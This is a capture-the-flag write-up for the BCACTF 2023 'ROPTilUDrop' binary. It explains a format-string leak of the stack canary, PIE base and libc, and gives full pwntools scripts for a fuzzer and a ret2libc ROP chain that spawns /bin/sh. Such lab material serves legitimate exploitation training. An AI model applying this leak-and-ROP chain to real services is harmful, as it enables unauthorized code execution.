<h3> ROPTilUDrop BCACTF '23 </h3>

![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c3ffa0b4-7f30-41c7-a299-d1dc8017ab83)

We are given the binary and it's remote libc file tyty 💙

After downloading it let's do some basic file checks
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/d1b672f8-eb02-4ada-b99f-4b8539537700)

```
➜  pwn file roptiludrop
roptiludrop: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=952f9eb47468c4de465033ac5167308b6f375d59, for GNU/Linux 3.2.0, not stripped
➜  pwn checksec roptiludrop 
[*] '/tmp/pwn/roptiludrop'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

We are working with a x64 binary which is dynamically linked and not stripped :)

Also from the mitigations check we can see that all protections are enabled 

So this means we are going to have to do some ROPing

Let's run the binary to get an overview of what it does
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7641ddf1-c22d-4fa3-a59a-3c9cc88cd346)

Ok it asks for our input prints the value back with a leak also! and then receives our input again

Using IDA let's perform static anaylsis

Here's the pseudo decompiled main function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/aed347cb-2d2f-43b3-9a4f-568f0436a33b)

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setbuf(stdout, 0LL);
  setbuf(stdin, 0LL);
  setbuf(stderr, 0LL);
  life();
  puts("Party!");
  return 0;
}
```

From the main function we see that it just does buffering it then calls the life() function which returns back to the main function and prints out the text `Party!`

Here's the decompiled life function
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/83ab3d49-82f8-4ea3-9d8e-875c86fc909a)

```c
unsigned __int64 life()
{
  char format[24]; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("DO NOT STOP ROPPING\n> ");
  gets(format);
  printf(format);
  printf("What is this? %p\n", &printf);
  printf("\nDO NOT STOP ROPPING\n> ");
  fread(format, 1uLL, 0x50uLL, stdin);
  puts(format);
  return __readfsqword(0x28u) ^ v2;
}
```

Here's what it does:
- Stack canary is first initialzed to generate random 8 bytes
- Receives our input using gets() # bug here
- Uses printf to print out input back without using a format specifier # bug here
- Gives us a libc printf leak 
- Reads in 0x50 bytes from standard input to the format buffer
- Checks if the stack canary is still intact then if it returns true it goes back to the main function

From here we can see that we have a format string vulnerability and also a buffer overflow

Since there's a stack canary and also PIE is enabled we would need to work our way around that

The issue with PIE being enabled is that whenever the program runs it's memory region gets randomized making ROPing difficult 

But since we know we've got a format string vulnerability we can leak an ELF section from the binary then calculate the ELF main address

That's settled how about bypassing the stack canary?

Also it can still be bypassed since we've got a format string vulnerability that means we can leak the canary value off the stack 

That's settled I guess?

Let's get to exploitation!!!

We know that the offset to the canary is going to be 24 bytes and we already have a printf libc leak 

So I'll just now leak both the canary and a pie address to use

I made a script to fuzz that for me

```python
from pwn import *
import warnings

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
piebase
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './roptiludrop'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'warning'
warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Let's fuzz x values
for i in range(41):
    try:
        p = start()
        p.recvuntil('>')
        p.sendline('%{}$p'.format(i).encode())
        recv = p.recvline().split()
        result = recv[0].strip(b'What')
        print(str(i) + ': ' + str(result))
        p.close()
    except EOFError:
        pass
```

Running it shows this address which the last values doesn't change making it suitable for our PIE leak
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/85132920-fa36-40e9-8f58-164b7cc80a25)

Let's open up our debugger in this case `gdb-gef` and get what that address value it's pointed to
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1bb5f30b-a8ee-4cbe-a5a2-f2cf0a051768)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/61f3f346-c474-461e-b9b1-5a03e94a7586)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5bc54ecd-d7f1-430e-aef8-0d54718564be)

I used `%15$p` since that's the offset we want to leak 

Ok cool that's the main address of the binary which makes our PIE base address calculation quite easy

Now we need to get the canary address
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/aba84a71-b646-4871-b6cd-4fdf6f7b406a)

From the fuzz script I can tell it's at offset 9 also we can confirm it with using a debugger I used `gdb-pwndgb` I'm quite lazy :(
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/89626a6e-0663-494e-9812-660010059010)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/626457b5-1b4a-4594-a8df-6f4c74ae2ab6)

That's confirmed that our canary offset is at 9 

Well with this set we can just use a ROP technique called Ret2Libc 

Here's my script used to solve it locally

```python
#!/usr/bin/python3

from pwn import *
import warnings
import re

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
piebase
break *life+25
continue
'''.format(**locals())

# Binary filename
exe = './roptiludrop'
elf = context.binary = ELF(exe, checksec=False) 
context.log_level = 'info'
warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

libc = elf.libc

# Leak stack canary address & pie address
stack_canary = '%9$p'
pie_leak = '%15$p'
# pie_leak = '%17$p'
io.sendline(stack_canary.encode() + b' ' + pie_leak.encode())

# Extract the two addresses from the response
io.recvline()
leak = io.recvline().strip().split(b'What')
hex_values = []
for item in leak:
    hex_matches = re.findall(r'0x[\da-fA-F]+', item.decode())
    hex_values.extend(hex_matches)

canary = int(hex_values[0], 16)
leakedpie = int(hex_values[1], 16)
printf = int(hex_values[2], 16)
info("Canary address: %#x", canary)
info("Leaked Pie address: %#x", leakedpie)
info("Leaked printf address: %#x", printf)

# Calculate pie base address
elf.address = leakedpie - elf.symbols['main']
info("Piebase address: %#x", elf.address)

# Calculate base address
libc.address =  printf - libc.symbols['printf']
info("Libc base address %#x", libc.address)

# Send the exploit 
offset = 24 # overwrite the canary
padding = 8 
ret = 0x101a # 0x000000000000101a: ret; 
movaps = ret + elf.address # allign the stack 
pop_rdi = elf.address + 0x13b3
sh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']
info("System address found %#x", libc.symbols['system'])
info("/bin/sh address: %#x", sh)

payload = flat({
    offset: [
        canary,
        padding,
        pop_rdi,
        sh,
        movaps,
        system
        
    ]
})

io.sendline(payload)

io.interactive()
```
